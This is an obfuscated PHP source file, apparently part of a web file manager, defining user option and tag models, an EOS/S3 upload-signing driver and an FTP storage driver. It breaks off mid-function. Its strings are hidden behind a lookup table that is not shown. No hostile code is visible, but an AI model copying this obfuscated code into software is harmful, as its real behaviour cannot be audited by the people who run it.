<?php
 goto dø¦µ‹‚õŞ; aœÂ­ÍêµŞ: class UserOptionModel extends ModelBaseOption { protected $tableName = "\x75\x73\x65\162\137\x6f\160\x74\151\157\156"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($cŞÒºÔàÅ¤) { $a—òÃ“Àğ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (!defined($a—òÃ“Àğ[468])) { define($a—òÃ“Àğ[468], 0); } return "\125\163\x65\x72\x4f\160\x74\x69\x6f\156\x5f{$cŞÒºÔàÅ¤}\137" . USER_ID; } protected function filterWhere($a…×…óàé³) { $B„Óã´¯¹Ñ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (!defined($B„Óã´¯¹Ñ[468])) { define($B„Óã´¯¹Ñ[468], 0); } $a…×…óàé³[$B„Óã´¯¹Ñ[1550]] = USER_ID; return $a…×…óàé³; } public function cacheRemoveUser($a¦†½’¥Ó, $FœİÌÎ‹Çó) { return Cache::remove("\125\x73\145\x72\x4f\160\x74\x69\x6f\156\137{$a¦†½’¥Ó}\137" . $FœİÌÎ‹Çó); } protected function optionDefault($F÷Õš›ç¹™ = '') { $E¬‚¡¬Å‹Ø =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if ($F÷Õš›ç¹™ == $E¬‚¡¬Å‹Ø[33]) { return $GLOBALS[$E¬‚¡¬Å‹Ø[6]][$E¬‚¡¬Å‹Ø[2190]]; } if ($F÷Õš›ç¹™ == $E¬‚¡¬Å‹Ø[2191]) { return $GLOBALS[$E¬‚¡¬Å‹Ø[6]][$E¬‚¡¬Å‹Ø[2192]]; } } } class UserTagModel extends ModelBaseLight { public $optionType = "\x55\163\x65\162\x2e\164\141\x67\114\x69\163\x74"; public $modelType = "\125\163\145\x72\x4f\x70\x74\x69\x6f\x6e"; public $field = array("\156\141\x6d\x65", "\x73\x74\171\x6c\x65", "\x73\157\x72\x74"); public function listData($b£ì¦õÃÖ¡ = false, $DæÉÊ­¿çÆ = "\x73\x6f\162\164", $a‘Åî±™¹Ø = false) { return parent::listData($b£ì¦õÃÖ¡, $DæÉÊ­¿çÆ, $a‘Åî±™¹Ø); } public function remove($BÄµ§˜ã‚) { return parent::remove($BÄµ§˜ã‚); } public function add($a°’˜‚ñòµ, $E÷Ó´×Å¥º = "\154\x61\x62\145\x6c\55\147\x72\145\x79\x2d\x6e\157\162\155\141\x6c") { $eÖ«ÙÛ•Şš =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if ($this->findByName($a°’˜‚ñòµ)) { return !1; } $eßì÷Å½í = array($eÖ«ÙÛ•Şš[415] => $a°’˜‚ñòµ, $eÖ«ÙÛ•Şš[478] => $E÷Ó´×Å¥º, $eÖ«ÙÛ•Şš[1723] => $this->getSort($eÖ«ÙÛ•Şš[256]) + 1); return parent::insert($eßì÷Å½í); } public function update($D´ÀõñÏÖ“, $CÜôÉÚ«) { $D×èîîêÙø =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $BÛâÅ»§Å = $this->listData($D´ÀõñÏÖ“); $c·÷‹­ç»Â = $this->findByName($CÜôÉÚ«[$D×èîîêÙø[28]]); if (!$BÛâÅ»§Å || $c·÷‹­ç»Â && $c·÷‹­ç»Â[$D×èîîêÙø[395]] != $BÛâÅ»§Å[$D×èîîêÙø[395]]) { return !1; } return parent::update($D´ÀõñÏÖ“, $CÜôÉÚ«); } public function moveTop($AñÊïùˆ¥Ù) { $dÍ¡´õ¸¤‘ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $C’Ş™‡¯ = parent::listData(); $C˜¡‘á–„ = $this->getSort($dÍ¡´õ¸¤‘[255]); foreach ($C’Ş™‡¯ as &$Dò¾¤½â†) { if ($Dò¾¤½â†[$dÍ¡´õ¸¤‘[395]] == $AñÊïùˆ¥Ù) { $Dò¾¤½â†[$dÍ¡´õ¸¤‘[1742]] = $C˜¡‘á–„; continue; } $Dò¾¤½â†[$dÍ¡´õ¸¤‘[1742]] += 1; } unset($Dò¾¤½â†); return parent::resetData($C’Ş™‡¯); } public function moveBottom($aÖ…É§øÆĞ) { $fÍğîª‰²ƒ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $fË¶¶ƒŒÃ = $this->getSort($fÍğîª‰²ƒ[256]) + 1; return parent::update($aÖ…É§øÆĞ, array($fÍğîª‰²ƒ[1742] => $fË¶¶ƒŒÃ)); } public function resetSort($B…Œ¢ƒ”) { goto DöÎ»šğÃ‚; dè ¸¸«§É: for ($f‹ª©¸—ì¼ = 0; $f‹ª©¸—ì¼ < count($B…Œ¢ƒ”); $f‹ª©¸—ì¼++) { $CäË—·ô„[$B…Œ¢ƒ”[$f‹ª©¸—ì¼] . $AåŞ³•Á¥³[33]] = $f‹ª©¸—ì¼ + 1; } $C½õéª¸î = parent::listData(); foreach ($C½õéª¸î as &$cÕÈ­÷òäÏ) { $c†°©‚¿µ¯ = $CäË—·ô„[$cÕÈ­÷òäÏ[$AåŞ³•Á¥³[395]]]; $cÕÈ­÷òäÏ[$AåŞ³•Á¥³[1742]] = $c†°©‚¿µ¯ ? $c†°©‚¿µ¯ : $cÕÈ­÷òäÏ[$AåŞ³•Á¥³[1742]]; } goto Cøã’§¾‡£; DöÎ»šğÃ‚: $AåŞ³•Á¥³ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $CäË—·ô„ = array(); $B…Œ¢ƒ” = is_array($B…Œ¢ƒ”) ? $B…Œ¢ƒ” : array(); goto dè ¸¸«§É; Cøã’§¾‡£: unset($cÕÈ­÷òäÏ); return parent::resetData($C½õéª¸î); goto cêß›¨â¼ó; cêß›¨â¼ó: } private function getSort($f¼ªÏµâ¼İ) { $a®šÖ˜†‡ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $AâáºéĞ²å = parent::listData(); $BÌÙÒæß“— = array_to_keyvalue($AâáºéĞ²å, $a®šÖ˜†‡[33], $a®šÖ˜†‡[1742]); if (!$BÌÙÒæß“—) { $BÌÙÒæß“— = array(0); } $féøù…±µ¸ = $f¼ªÏµâ¼İ == $a®šÖ˜†‡[256] ? max($BÌÙÒæß“—) : min($BÌÙÒæß“—); return intval($féøù…±µ¸); } } goto c­ªÈ“±§ƒ; D‹®ô‰µ¬: class PathDriverEOS extends PathDriverBaseS3 { public function __construct($b…Š¨’Áõ„) { parent::__construct($b…Š¨’Áõ„); $this->signatureVersion($_SERVER[Ôğ—¤Šµˆ˜ñ£][212]); } public function uploadFormData($b…Šƒ¤ÍÒ®, $a¼°î¥ÙƒÓ = 3600) { goto aÛ˜®ä§¨Ù; E¸öæ’¹Öô: $AŠ•ÆõÍ‹ = array($Aš§ÏòÙ‚¼[211] => $Aš§ÏòÙ‚¼[33], $Aš§ÏòÙ‚¼[1257] => $Aš§ÏòÙ‚¼[33], $Aš§ÏòÙ‚¼[1214] => $eª‡¿çÓŒà, $Aš§ÏòÙ‚¼[1218] => $DÛªóÀ‡ğ, $Aš§ÏòÙ‚¼[1222] => $e”‡‡…Ö½Ş, $Aš§ÏòÙ‚¼[1258] => $eá¸ïÑ‰Ë, $Aš§ÏòÙ‚¼[1259] => $EİƒØì¼¾Ç, $Aš§ÏòÙ‚¼[1260] => $Dšˆà²Í, $Aš§ÏòÙ‚¼[1261] => $fˆ´ºß’, $Aš§ÏòÙ‚¼[1262] => $D“ËÆÁº, $Aš§ÏòÙ‚¼[175] => $this->getHost()); return $AŠ•ÆõÍ‹; goto C¯†¶äÚÒ; aÛ˜®ä§¨Ù: $Aš§ÏòÙ‚¼ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $eª‡¿çÓŒà = $Aš§ÏòÙ‚¼[192]; $EİƒØì¼¾Ç = $Aš§ÏòÙ‚¼[1245]; goto b…´ Âš; C›î‹Üî°¨: $fá¼¾¿È•Ü = array($this->accessKey, $DØ¶ùÎºøØ, $this->region, $Aâ„èí¦Ê‚, $F‘¯¸áÁĞ); $eá¸ïÑ‰Ë = implode($Aš§ÏòÙ‚¼[8], $fá¼¾¿È•Ü); $c¹Åƒ§Ãš¾ = array($Aš§ÏòÙ‚¼[1212] => gmdate($Aš§ÏòÙ‚¼[1211], strtotime($Aš§ÏòÙ‚¼[1248])), $Aš§ÏòÙ‚¼[1213] => array(array($Aš§ÏòÙ‚¼[1215] => $this->bucket), array($Aš§ÏòÙ‚¼[1214] => $eª‡¿çÓŒà), array($Aš§ÏòÙ‚¼[1216], $Aš§ÏòÙ‚¼[1217], $Aš§ÏòÙ‚¼[33]), array($Aš§ÏòÙ‚¼[1216], $Aš§ÏòÙ‚¼[1249], $Aš§ÏòÙ‚¼[33]), array($Aš§ÏòÙ‚¼[1216], $Aš§ÏòÙ‚¼[1250], $Aš§ÏòÙ‚¼[33]), array($Aš§ÏòÙ‚¼[1218] => $DÛªóÀ‡ğ), array($Aš§ÏòÙ‚¼[1251] => $eá¸ïÑ‰Ë), array($Aš§ÏòÙ‚¼[1252] => $EİƒØì¼¾Ç), array($Aš§ÏòÙ‚¼[1253] => $Dšˆà²Í), array($Aš§ÏòÙ‚¼[1254] => $fˆ´ºß’))); goto A°Í¡¶Ó; bÉÙä»°Ìà: $CŒßŒ¶ŠÊ¤ = hash_hmac($Aš§ÏòÙ‚¼[1255], $Aâ„èí¦Ê‚, $D¸®ç­“ƒé, !0); $bÚÇ¨‰¥—¾ = hash_hmac($Aš§ÏòÙ‚¼[1255], $F‘¯¸áÁĞ, $CŒßŒ¶ŠÊ¤, !0); $D“ËÆÁº = hash_hmac($Aš§ÏòÙ‚¼[1255], $e”‡‡…Ö½Ş, $bÚÇ¨‰¥—¾); goto E¸öæ’¹Öô; DôÀ¹Ş¡Ìö: $F‘¯¸áÁĞ = $Aš§ÏòÙ‚¼[1247]; $fˆ´ºß’ = $a¼°î¥ÙƒÓ . $Aš§ÏòÙ‚¼[33]; $DÛªóÀ‡ğ = $Aš§ÏòÙ‚¼[1210]; goto C›î‹Üî°¨; A°Í¡¶Ó: $e”‡‡…Ö½Ş = base64_encode(json_encode($c¹Åƒ§Ãš¾)); $CŸĞ›¼Éâ‰ = hash_hmac($Aš§ÏòÙ‚¼[1255], $DØ¶ùÎºøØ, $Aš§ÏòÙ‚¼[1256] . $this->secret, !0); $D¸®ç­“ƒé = hash_hmac($Aš§ÏòÙ‚¼[1255], $this->region, $CŸĞ›¼Éâ‰, !0); goto bÉÙä»°Ìà; b…´ Âš: $Aâ„èí¦Ê‚ = $Aš§ÏòÙ‚¼[59]; $Dšˆà²Í = gmdate($Aš§ÏòÙ‚¼[1246]); $DØ¶ùÎºøØ = gmdate($Aš§ÏòÙ‚¼[732]); goto DôÀ¹Ş¡Ìö; C¯†¶äÚÒ: } } class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\x31"; private $config = array(); public function __construct($E¾Óáï°ö¨) { parent::__construct(); if (count($E¾Óáï°ö¨) > 0) { $this->_init($E¾Óáï°ö¨); } } public function __destruct() { if (!$this->_isconn()) { return !1; } return @ftp_close($this->connect); } private function charsetReset($b£Ş²©´²) { $BÈ³›Ã“Ï =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; global $config; $this->appCharset = $config[$BÈ³›Ã“Ï[1263]]; $this->systemCharset = $config[$BÈ³›Ã“Ï[1264]]; if (isset($b£Ş²©´²[$BÈ³›Ã“Ï[1265]]) && $b£Ş²©´²[$BÈ³›Ã“Ï[1265]]) { $this->systemCharset = $b£Ş²©´²[$BÈ³›Ã“Ï[1265]]; } } public function iconvApp($A¸·ÙÈ©Û„) { return $this->iconvTo($A¸·ÙÈ©Û„, $this->systemCharset, $this->appCharset); } public function iconvSystem($d›—Ï´ª×Ö) { return $this->iconvTo($d›—Ï´ª×Ö, $this->appCharset, $this->systemCharset); } public function getPathOuter($B‡…½‰°¶©) { goto dàš«×ïãâ; dàš«×ïãâ: $añ‘¶ôÑÇÍ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $FÈÜÄ‹ºÀ = $this->iconvApp($this->pathBase); $B‡…½‰°¶© = $this->iconvApp($B‡…½‰°¶©); goto e÷¹’Ö¼±˜; Cáë¶ß¸”ó: return $this->pathDriver . $añ‘¶ôÑÇÍ[8] . ltrim($B‡…½‰°¶©, $añ‘¶ôÑÇÍ[8]); goto bÖñŞ„ÄÇ¹; DÙ¤±ÎãÚ: $B‡…½‰°¶© = KodIO::clear($B‡…½‰°¶©); $B‡…½‰°¶© = substr($B‡…½‰°¶©, strlen($FÈÜÄ‹ºÀ)); if (empty($this->pathDriver)) { return $B‡…½‰°¶©; } goto Cáë¶ß¸”ó; e÷¹’Ö¼±˜: if (substr($FÈÜÄ‹ºÀ, 0, 2) == $añ‘¶ôÑÇÍ[1266]) { $FÈÜÄ‹ºÀ = BASIC_PATH . substr($FÈÜÄ‹ºÀ, 2); } if (substr($B‡…½‰°¶©, 0, 2) == $añ‘¶ôÑÇÍ[1266]) { $B‡…½‰°¶© = BASIC_PATH . substr($B‡…½‰°¶©, 2); } $FÈÜÄ‹ºÀ = KodIO::clear($FÈÜÄ‹ºÀ); goto DÙ¤±ÎãÚ; bÖñŞ„ÄÇ¹: } private function _init($e±¨§»›Â = array()) { $C‹Ó÷Ü÷· =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (!function_exists($C‹Ó÷Ü÷·[1267])) { throw new Exception(LNG($C‹Ó÷Ü÷·[1268])); } $this->config = $e±¨§»›Â; $this->charsetReset($e±¨§»›Â); foreach ($e±¨§»›Â as $Bµî´Í„¼Ğ => $c¹‚´À¬îš) { if (isset($this->{$Bµî´Í„¼Ğ})) { $this->{$Bµî´Í„¼Ğ} = $c¹‚´À¬îš; } } return $this->_login($e±¨§»›Â); } private function _login($E¢‹µöƒŠ¼) { goto bôå„‘´Ïà; bôå„‘´Ïà: $cÇÓÙê‰ƒº =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; static $E‹óÌà¦…µ = array(); $C¦¡ÕÉ° = md5(json_encode($E¢‹µöƒŠ¼)); goto cõ±ŒÊºÆ; f»Õñ–ñ‰â: $aôë“šø…š = isset($dğóŸâ¹¹ [$cÇÓÙê‰ƒº[174]]) && $dğóŸâ¹¹ [$cÇÓÙê‰ƒº[174]] == $cÇÓÙê‰ƒº[1269] ? !0 : !1; $this->scheme = $aôë“šø…š ? $cÇÓÙê‰ƒº[1270] : $cÇÓÙê‰ƒº[1271]; $this->port = isset($dğóŸâ¹¹ [$cÇÓÙê‰ƒº[176]]) ? $dğóŸâ¹¹ [$cÇÓÙê‰ƒº[176]] : 21; goto A¨é³Å’²×; dåÉ“÷‰‚Á: @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $aßøë”¤×× = $this->pasv == $cÇÓÙê‰ƒº[87] ? !0 : !1; @ftp_pasv($this->connect, $aßøë”¤××); goto eã»ÔòµÈõ; A¨é³Å’²×: $this->connect = @ftp_connect($this->host, $this->port, 5); if ($this->connect === !1) { return !1; } $Dæİ”ñÁÊ¨ = @ftp_login($this->connect, $this->username, $this->userpass); goto dåÉ“÷‰‚Á; eã»ÔòµÈõ: $E‹óÌà¦…µ[$C¦¡ÕÉ°] = array($cÇÓÙê‰ƒº[1272] => $this->connect, $cÇÓÙê‰ƒº[175] => $this->host, $cÇÓÙê‰ƒº[174] => $this->scheme, $cÇÓÙê‰ƒº[176] => $this->port); return $Dæİ”ñÁÊ¨; goto cò£ò—Œµ; cõ±ŒÊºÆ: if (isset($E‹óÌà¦…µ[$C¦¡ÕÉ°])) { foreach ($E‹óÌà¦…µ[$C¦¡ÕÉ°] as $eùÑåÅˆ“° => $cÂÏËÇ¼¯ô) { $this->{$eùÑåÅˆ“°} = $cÂÏËÇ¼¯ô; } return !0; } $dğóŸâ¹¹  = parse_url(trim($this->server, $cÇÓÙê‰ƒº[8])); $this->host = $dğóŸâ¹¹ [$cÇÓÙê‰ƒº[175]]; goto f»Õñ–ñ‰â; cò£ò—Œµ: } private function _isconn() { if (is_resource($this->connect)) { return !0; } return $this->_login($this->config); } public function mkfile($CÎÕ½‡ÉÊ, $CŞ‰îì×áê = '', $CÈ»ÁÈ¸äÂ = REPEAT_RENAME) { if ($this->setContent($CÎÕ½‡ÉÊ, $CŞ‰îì×áê)) { return $this->getPathOuter($CÎÕ½‡ÉÊ); } return !1; } public function mkdir($eàÓè¹”ƒ, $c½ÓÔÆÒµ = REPEAT_SKIP) { if (!$this->_isconn()) { return !1; } $eàÓè¹”ƒ = $this->iconvSystem($eàÓè¹”ƒ); if ($this->_isFolder($eàÓè¹”ƒ) || @ftp_mkdir($this->connect, $eàÓè¹”ƒ)) { return $this->getPathOuter($eàÓè¹”ƒ); } if (!$this->mkdir($this->pathFather($eàÓè¹”ƒ))) { return !1; } if ($eàÓè¹”ƒ = @ftp_mkdir($this->connect, $eàÓè¹”ƒ)) { return $this->getPathOuter($eàÓè¹”ƒ); } return !1; } public function copyFile($c ùÅø†ù³, $e§÷Ò„˜œ) { goto BšÚõ‹ƒ¼; Dİ³Á¿‡: $this->tempFileRemve($BÕŞ‹ƒŠõ); return $F‚õ¼õ×; goto cåÙ‹Ñ¢Šé; BšÚõ‹ƒ¼: if (!$this->_isconn()) { return !1; } $aóÄ»éÇœÄ = $this->pathThis($this->iconvSystem($c ùÅø†ù³)); $BÕŞ‹ƒŠõ = $this->tempFile($aóÄ»éÇœÄ); goto dÒÂ‡òÃíÜ; dÒÂ‡òÃíÜ: $A÷±ÚÖÖÈ· = $this->iconvApp($BÕŞ‹ƒŠõ); $this->download($c ùÅø†ù³, $A÷±ÚÖÖÈ·); $F‚õ¼õ× = $this->upload($e§÷Ò„˜œ, $A÷±ÚÖÖÈ·); goto Dİ³Á¿‡; cåÙ‹Ñ¢Šé: } public function moveFile($f›İ«£ó©›, $c³°†ğ©˜) { if (!$this->_isconn()) { return !1; } $f›İ«£ó©› = $this->iconvSystem($f›İ«£ó©›); $c³°†ğ©˜ = $this->iconvSystem($c³°†ğ©˜); $cœ”‚„Ìê = @ftp_rename($this->connect, $f›İ«£ó©›, $c³°†ğ©˜); return $cœ”‚„Ìê ? $this->getPathOuter($c³°†ğ©˜) : !1; } public function delFile($DÁÇ‹ëÙãõ) { if (!$this->_isconn()) { return !1; } $DÁÇ‹ëÙãõ = $this->iconvSystem($DÁÇ‹ëÙãõ); return @ftp_delete($this->connect, $DÁÇ‹ëÙãõ); } public function delFolder($fİö£‡¥¿) { goto E¶ß¹‡ù§°; E¶ß¹‡ù§°: if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $aãïŒÂé§ö = $D¥ß÷ŒˆÏ³ = array(); goto D±¤„ëŞãŸ; D±¤„ëŞãŸ: $this->fileList($fİö£‡¥¿, $aãïŒÂé§ö, $D¥ß÷ŒˆÏ³, !0); $this->listItemCache = !0; foreach ($D¥ß÷ŒˆÏ³ as $EïºµÕ·º–) { $Eã¿è°Ì¢À = $this->iconvSystem($EïºµÕ·º–[$_SERVER[Ôğ—¤Šµˆ˜ñ£][28]]); $cÅ±ë˜Ø£« = @ftp_delete($this->connect, $Eã¿è°Ì¢À); if (!$cÅ±ë˜Ø£«) { return !1; } } goto b„»†‡ÜËÂ; b„»†‡ÜËÂ: foreach ($aãïŒÂé§ö as $Eã¿è°Ì¢À) { $Eã¿è°Ì¢À = $this->iconvSystem($Eã¿è°Ì¢À); $cÅ±ë˜Ø£« = @ftp_rmdir($this->connect, $Eã¿è°Ì¢À); if (!$cÅ±ë˜Ø£«) { return !1; } } $fİö£‡¥¿ = $this->iconvSystem($fİö£‡¥¿); return @ftp_rmdir($this->connect, $fİö£‡¥¿); goto D‡¶×ÖÃÓ; D‡¶×ÖÃÓ: } public function rename($b³ŞŒ—Â¨, $BÎº±Æ) { goto aÌóìÚ¦îâ; aÌóìÚ¦îâ: $c„ì‹Ø‡›ğ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (!$this->_isconn()) { return !1; } $fÅöêö›¼ = $this->fileNameAuto($this->pathFather($b³ŞŒ—Â¨), $BÎº±Æ); goto f„•ÛœÃ¤ï; f„•ÛœÃ¤ï: $fÅöêö›¼ = $this->iconvSystem($fÅöêö›¼); $b³ŞŒ—Â¨ = $this->iconvSystem($b³ŞŒ—Â¨); $CÌÏ„ÓÊèí = $this->pathFather($b³ŞŒ—Â¨); goto Aì§†„÷Åï; BÈ¡Ù‡»èª: return $C¤É‡ Ø…Ş ? $this->getPathOuter($bä…ƒÆ‘ Á) : !1; goto eŞò—ïğÕ; Aì§†„÷Åï: $bä…ƒÆ‘ Á = rtrim($CÌÏ„ÓÊèí, $c„ì‹Ø‡›ğ[8]) . $c„ì‹Ø‡›ğ[8] . $fÅöêö›¼; $C¤É‡ Ø…Ş = @ftp_rename($this->connect, $b³ŞŒ—Â¨, $bä…ƒÆ‘ Á); $bä…ƒÆ‘ Á = $this->iconvApp($bä…ƒÆ‘ Á); goto BÈ¡Ù‡»èª; eŞò—ïğÕ: } private function folderInfo($eİŞ‰ÅÜŒÆ, $d¡¼æÖÃÁ‹ = false) { $E§Î™°ŸÙÏ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $bö„Âçå©Ğ = array($E§Î™°ŸÙÏ[28] => $this->pathThis($eİŞ‰ÅÜŒÆ), $E§Î™°ŸÙÏ[76] => $this->getPathOuter($E§Î™°ŸÙÏ[8] . $eİŞ‰ÅÜŒÆ), $E§Î™°ŸÙÏ[29] => $E§Î™°ŸÙÏ[77]); if ($d¡¼æÖÃÁ‹) { return $bö„Âçå©Ğ; } $bö„Âçå©Ğ[$E§Î™°ŸÙÏ[194]] = $bö„Âçå©Ğ[$E§Î™°ŸÙÏ[84]] = 0; $bö„Âçå©Ğ[$E§Î™°ŸÙÏ[195]] = $bö„Âçå©Ğ[$E§Î™°ŸÙÏ[196]] = !0; return $bö„Âçå©Ğ; } private function fileInfo($bìÌé¬½÷, $e¨ªŞÅÉÄ = false, $F»Ãò…¾¸ = array()) { goto A‡ØŞˆºŒÏ; A‡ØŞˆºŒÏ: $cÎÆĞ¡âÏ² =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $D¨¿Á¸‡î¸ = array($cÎÆĞ¡âÏ²[28] => $this->pathThis($bìÌé¬½÷), $cÎÆĞ¡âÏ²[76] => $this->getPathOuter($cÎÆĞ¡âÏ²[8] . $bìÌé¬½÷), $cÎÆĞ¡âÏ²[29] => $cÎÆĞ¡âÏ²[193], $cÎÆĞ¡âÏ²[78] => isset($F»Ãò…¾¸[$cÎÆĞ¡âÏ²[78]]) ? $F»Ãò…¾¸[$cÎÆĞ¡âÏ²[78]] : 0, $cÎÆĞ¡âÏ²[168] => $this->ext($bìÌé¬½÷)); if ($e¨ªŞÅÉÄ) { return $D¨¿Á¸‡î¸; } goto dˆÍª„ª¯Õ; bšÍÔªÕêœ: return $D¨¿Á¸‡î¸; goto DÃ½šä¡°; dˆÍª„ª¯Õ: $D¨¿Á¸‡î¸[$cÎÆĞ¡âÏ²[194]] = $D¨¿Á¸‡î¸[$cÎÆĞ¡âÏ²[84]] = 0; $D¨¿Á¸‡î¸[$cÎÆĞ¡âÏ²[195]] = $D¨¿Á¸‡î¸[$cÎÆĞ¡âÏ²[196]] = !0; $BªîìÑ¿Ä = $this->iconvSystem($bìÌé¬½÷); goto AàÉ Á¡¸; AàÉ Á¡¸: $D¨¿Á¸‡î¸[$cÎÆĞ¡âÏ²[84]] = @ftp_mdtm($this->connect, $BªîìÑ¿Ä); if (empty($F»Ãò…¾¸)) { $F»Ãò…¾¸ = $this->objectMeta($bìÌé¬½÷); if (!$F»Ãò…¾¸) { return $D¨¿Á¸‡î¸; } } $D¨¿Á¸‡î¸[$cÎÆĞ¡âÏ²[78]] = $F»Ãò…¾¸[$cÎÆĞ¡âÏ²[78]]; goto bšÍÔªÕêœ; DÃ½šä¡°: } public function size($aõ˜ŠÓíˆ¢) { $AÅŞ‡½¬êì = $this->objectMeta($aõ˜ŠÓíˆ¢); return $AÅŞ‡½¬êì ? $AÅŞ‡½¬êì[$_SERVER[Ôğ—¤Šµˆ˜ñ£][78]] : 0; } public function info($d®Ğ¤¤‰¿ç) { if ($this->isFile($d®Ğ¤¤‰¿ç)) { return $this->fileInfo($d®Ğ¤¤‰¿ç, 0); } else { if ($this->isFolder($d®Ğ¤¤‰¿ç)) { return $this->folderInfo($d®Ğ¤¤‰¿ç); } } return !1; } private function fileList($AßøãíÖŞ¯, &$A‚Á—ÈÑĞ, &$B¸ó·ŠÆ¨©, $c‹Œé„«–Ÿ = false) { goto Aí‚˜Ú¡ˆ¡; eÏ÷ŒÜôç—: $D¥®îŠù‘‰ = $this->listItemCache === !1 ? !1 : !0; $EÍõ´˜ = @ftp_rawlist($this->connect, $AßøãíÖŞ¯); if (!$EÍõ´˜) { $EÍõ´˜ = array(); } goto AñĞ’¿Å·; EÂ‡ˆÌŞ¸Ú: @ftp_chdir($this->connect, $fº“ãÅ—²[8]); $AßøãíÖŞ¯ = rtrim($AßøãíÖŞ¯, $fº“ãÅ—²[8]) . $fº“ãÅ—²[8]; check_abort(); goto eÏ÷ŒÜôç—; AñĞ’¿Å·: $fÒñ¤İŸ¾” = array($fº“ãÅ—²[95] => 1, $fº“ãÅ—²[1273] => 1); foreach ($EÍõ´˜ as $fˆÄìëåŒ‹) { goto Eø¬™İšâÎ; Eø¬™İšâÎ: $FõĞ¦÷ÀĞ = $this->_listItem($fˆÄìëåŒ‹); if ($FõĞ¦÷ÀĞ[0] == $fº“ãÅ—²[740]) { continue; } $fƒ³á‰˜öõ = $FõĞ¦÷ÀĞ[8]; goto eÆÈ’ƒ„; F…ˆÏ½¾±Ê: if (substr($fˆÄìëåŒ‹, 0, 1) == $fº“ãÅ—²[1274]) { $bÌàÇ¥—Áë[$fº“ãÅ—²[29]] = $fº“ãÅ—²[77]; $bÌàÇ¥—Áë[$fº“ãÅ—²[78]] = 0; } $c³¤İ’Û±Û = $bÌàÇ¥—Áë[$fº“ãÅ—²[29]] == $fº“ãÅ—²[77] ? !0 : !1; if ($D¥®îŠù‘‰) { $this->cacheMethod($fº“ãÅ—²[199], $fƒ³á‰˜öõ, $c³¤İ’Û±Û); $this->cacheMethod($fº“ãÅ—²[200], $fƒ³á‰˜öõ, $bÌàÇ¥—Áë); } goto d¬Çó§£ƒ‹; eÆÈ’ƒ„: if (empty($fƒ³á‰˜öõ) && $fƒ³á‰˜öõ !== $fº“ãÅ—²[191] || isset($fÒñ¤İŸ¾”[$fƒ³á‰˜öõ])) { continue; } $fƒ³á‰˜öõ = $this->iconvApp($AßøãíÖŞ¯ . ltrim($fƒ³á‰˜öõ, $fº“ãÅ—²[8])); $bÌàÇ¥—Áë = array($fº“ãÅ—²[28] => $fƒ³á‰˜öõ, $fº“ãÅ—²[29] => $fº“ãÅ—²[193], $fº“ãÅ—²[78] => $FõĞ¦÷ÀĞ[4]); goto F…ˆÏ½¾±Ê; d¬Çó§£ƒ‹: if ($c³¤İ’Û±Û) { $A‚Á—ÈÑĞ[] = $fƒ³á‰˜öõ; if ($c‹Œé„«–Ÿ) { $this->fileList($fƒ³á‰˜öõ, $A‚Á—ÈÑĞ, $B¸ó·ŠÆ¨©, $c‹Œé„«–Ÿ); } continue; } $B¸ó·ŠÆ¨©[] = $bÌàÇ¥—Áë; goto eà„ãÙ ô; eà„ãÙ ô: } if ($D¥®îŠù‘‰) { $this->cacheMethod($fº“ãÅ—²[199], $AßøãíÖŞ¯, !0); } goto aîµ„ŒŠ¡; Aí‚˜Ú¡ˆ¡: $fº“ãÅ—² =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $AßøãíÖŞ¯ = $this->iconvSystem($AßøãíÖŞ¯); if (!$this->isFolder($AßøãíÖŞ¯)) { return !1; } goto EÂ‡ˆÌŞ¸Ú; aîµ„ŒŠ¡: } private function _listItem($CÌµù×ôéÛ) { if (empty($CÌµù×ôéÛ)) { return array(); } $bõ•²À·¡³ = preg_split($_SERVER[Ôğ—¤Šµˆ˜ñ£][1275], $CÌµù×ôéÛ); if (count($bõ•²À·¡³) <= 9) { return $bõ•²À·¡³; } $bõ•²À·¡³[8] = trim(substr($CÌµù×ôéÛ, strpos($CÌµù×ôéÛ, $bõ•²À·¡³[7]) + strlen($bõ•²À·¡³[7]))); return array_splice($bõ•²À·¡³, 0, 9); } public function listPath($FÊØİÎÚˆÊ, $F‘×±Ï©×‚ = false) { goto cÍºø‰µ¢; e…ß‰µÓù‰: return array($f®ÄËµâÌÉ[75] => $C‡òÙŞËˆß, $f®ÄËµâÌÉ[74] => $d‡ÓË²ò¶ñ); goto DöøÂÉÈ; AÂ÷½Ñçù: $this->fileList($FÊØİÎÚˆÊ, $C‡òÙŞËˆß, $d‡ÓË²ò¶ñ); foreach ($C‡òÙŞËˆß as $d‰­«ŸÅ™š => $B…¬òæÎé) { $C‡òÙŞËˆß[$d‰­«ŸÅ™š] = $this->folderInfo($B…¬òæÎé, $F‘×±Ï©×‚); } foreach ($d‡ÓË²ò¶ñ as $d‰­«ŸÅ™š => $B…¬òæÎé) { $d‡ÓË²ò¶ñ[$d‰­«ŸÅ™š] = $this->fileInfo($B…¬òæÎé[$f®ÄËµâÌÉ[28]], $F‘×±Ï©×‚, $B…¬òæÎé); } goto e…ß‰µÓù‰; cÍºø‰µ¢: $f®ÄËµâÌÉ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (!$this->_isconn()) { return !1; } $C‡òÙŞËˆß = $d‡ÓË²ò¶ñ = array(); goto AÂ÷½Ñçù; DöøÂÉÈ: } public function has($C˜Î–‡©Ş, $AÆ–Ÿ½ˆ‚¹ = false, $d·˜Êõ‰â£ = 